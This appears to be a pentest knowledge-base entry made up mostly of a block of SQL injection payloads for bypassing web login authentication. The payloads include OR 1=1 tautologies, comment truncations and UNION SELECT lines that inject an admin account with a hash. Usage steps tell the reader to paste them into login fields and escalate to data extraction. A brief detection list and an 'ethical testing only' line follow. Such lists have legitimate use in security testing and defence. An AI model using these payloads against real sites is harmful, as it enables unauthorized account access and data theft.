---
type: code
language: SQL
verified: true
tags:
  - sql-injection
  - authentication-bypass
  - payload
platforms:
  - Web
validated: true
---

# SQL-Auth-Bypass-Payloads

## Code

```sql
'-' ' ' '&' '^' '*' or 1=1 limit 1 -- -+ '="or' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' '-||0' "-||0" "-" " " "&" "^" "*" '--' "--" '--' / "--" " or ""-" " or "" " " or ""&" " or ""^" " or ""*" or true-- " or true-- ' or true-- ") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x')) or (('x'))=(('x " or "x"="x " ) or ("x")=("x or 2 like 2 or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin' -- - admin' # admin'/* admin' or '2' LIKE '1 admin' or 2 LIKE 2-- admin' or 2 LIKE 2# admin') or 2 LIKE 2# admin') or 2 LIKE 2-- admin') or ('2' LIKE '2 admin') or ('2' LIKE '2'# admin') or ('2' LIKE '2'/* admin' or '1'='1 admin' or '1'='1'-- admin' or '1'='1'# admin' or '1'='1'/* admin'or 1=1 or ''=' admin' or 1=1 admin' or 1=1-- admin' or 1=1# admin' or 1=1/* admin') or ('1'='1 admin') or ('1'='1'-- admin') or ('1'='1'# admin') or ('1'='1'/* admin') or '1'='1 admin') or '1'='1'-- admin') or '1'='1'# admin') or '1'='1'/* 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 admin" -- admin';-- azer admin" # admin"/* admin" or "1"="1 admin" or "1"="1"-- admin" or "1"="1"# admin" or "1"="1"/* admin"or 1=1 or ""=" admin" or 1=1 admin" or 1=1-- admin" or 1=1# admin" or 1=1/* admin") or ("1"="1 admin") or ("1"="1"-- admin") or ("1"="1"# admin") or ("1"="1"/* admin") or "1"="1 admin") or "1"="1"-- admin") or "1"="1"# admin") or "1"="1"/* 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

## Description

This code snippet is a comprehensive collection of SQL injection payloads specifically designed for authentication bypass in web login forms. It includes variations for different SQL dialects (e.g., MySQL with -- comments, PostgreSQL with /* */), boolean-based injections (e.g., OR 1=1), and UNION-based data extraction examples. These payloads exploit unsanitized inputs to make authentication queries always true or to union additional data like hardcoded admin credentials and hashes. Use in ethical testing only to identify vulnerabilities.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | These are static payloads; substitute into form fields directly (e.g., username: admin' OR 1=1 --). For UNION examples, replace 'admin' and the hash with target values if known. | admin' OR '1'='1' -- |

## Usage

Copy and paste individual payloads into login form fields (username or password) during manual testing. Start with simple ones like ' OR 1=1 -- and escalate to UNION SELECT for data exfiltration. Best used with a proxy like Burp Suite to intercept and modify requests. In procedures like [[procedures/SQL-Injection-Authentication-Bypass]], select payloads based on error responses to match the database type.

## Detection

- Web application logs showing anomalous SQL queries with comments (--, #, /* */) or boolean conditions (1=1, true).
- WAF alerts for SQLi patterns in POST data to /login endpoints.
- Database error logs revealing injection attempts via syntax errors.
- Increased failed login attempts followed by successful unauthenticated access.
